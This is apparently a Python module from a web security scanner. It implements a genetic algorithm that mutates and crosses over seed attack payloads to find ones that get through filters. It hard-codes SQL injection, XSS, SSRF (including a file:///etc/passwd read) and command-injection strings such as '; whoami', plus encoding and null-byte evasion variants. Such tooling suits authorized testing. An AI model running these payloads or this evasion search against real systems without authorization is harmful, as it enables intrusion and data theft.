"""
Payload genetic engine: evolve novel payloads beyond static templates.
"""

import random
import time
from typing import Callable, Optional, Tuple
import requests

from core.diff_analyzer import DeltaVector, DifferentialAnalyzer
from core.payload_gene import PayloadGene

# Ensure backward compatibility for tests expecting these models directly inside this module.
__all__ = ["DeltaVector", "DifferentialAnalyzer", "PayloadGene", "PayloadGeneticEngine"]


class PayloadGeneticEngine:
    """Evolve payloads via mutation/crossover when standard payloads fail."""

    POPULATION_SIZE = 20
    MAX_GENERATIONS = 10
    SELECTION_TOP_K = 6  # Selection (top 30% by fitness)

    def __init__(self):
        self.base_payloads = {
            "SQLI": ["1'--", "1' OR '1'='1", "1\" OR \"1\"=\"1", "1' UNION SELECT NULL--"],
            "XSS": ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "SSRF": ["http://127.0.0.1", "http://localhost", "file:///etc/passwd"],
            "CMDI": ["; whoami", "| id", "& whoami"],
        }
        self.encodings = ["none", "url", "double_url", "unicode", "html_entity", "hex"]
        self.delimiters = ["", "'", '"', "`", "--", "/*"]
        self.wrappers = ["none", "json", "xml", "base64"]
        self.case_variants = ["none", "upper", "lower", "mixed"]

    def evolve(
        self,
        vuln_class: str,
        target_url: str,
        param_name: str,
        evaluator: Callable[[str], DeltaVector],
        baseline_response: requests.Response,
        remaining_budget_seconds: float,
    ) -> Tuple[Optional[str], float]:
        """Evolve payloads for remaining_budget_seconds."""
        start_time = time.time()
        best_payload = None
        best_score = 0.0

        # Initialize population from seed payloads
        base = self.base_payloads.get(vuln_class, ["test"])
        population = [
            PayloadGene(
                vuln_class=vuln_class,
                core_payload=random.choice(base),
                encoding_layer=random.choice(self.encodings),
                delimiter=random.choice(self.delimiters),
                wrapper=random.choice(self.wrappers),
                case_variant=random.choice(self.case_variants),
                null_byte=random.choice([True, False]),
            )
            for _ in range(self.POPULATION_SIZE)
        ]

        for generation in range(self.MAX_GENERATIONS):
            # Evaluate population
            scores = []
            for gene in population:
                payload = gene.render()
                try:
                    delta = evaluator(payload)
                    fitness = delta.fitness_score
                except Exception as e:
                    fitness = 0.0

                scores.append((fitness, gene))
                
                # If fitness hits >= 0.95, return immediately to confirm the finding
                if fitness >= 0.95:
                    return (payload, fitness)
                if fitness > best_score:
                    best_score = fitness
                    best_payload = payload

            # Check time budget
            elapsed = time.time() - start_time
            if (remaining_budget_seconds - elapsed) < 15.0:
                break

            # Selection
            scores.sort(key=lambda x: x[0], reverse=True)
            survivors = [gene for _, gene in scores[: self.SELECTION_TOP_K]]

            # Crossover + mutation
            offspring = []
            while len(offspring) < self.POPULATION_SIZE:
                if len(survivors) >= 2:
                    p1, p2 = random.sample(survivors, 2)
                    child = PayloadGene(
                        vuln_class=vuln_class,
                        core_payload=random.choice([p1.core_payload, p2.core_payload]),
                        encoding_layer=random.choice([p1.encoding_layer, p2.encoding_layer]),
                        delimiter=random.choice([p1.delimiter, p2.delimiter]),
                        wrapper=random.choice([p1.wrapper, p2.wrapper]),
                        case_variant=random.choice([p1.case_variant, p2.case_variant]),
                        null_byte=random.choice([p1.null_byte, p2.null_byte]),
                    )
                else:
                    child = survivors[0]

                # Mutation
                if random.random() > 0.5:
                    child.encoding_layer = random.choice(self.encodings)
                if random.random() > 0.5:
                    child.delimiter = random.choice(self.delimiters)
                if random.random() > 0.8:
                    child.null_byte = not child.null_byte

                offspring.append(child)

            population = offspring

        return (best_payload, best_score)
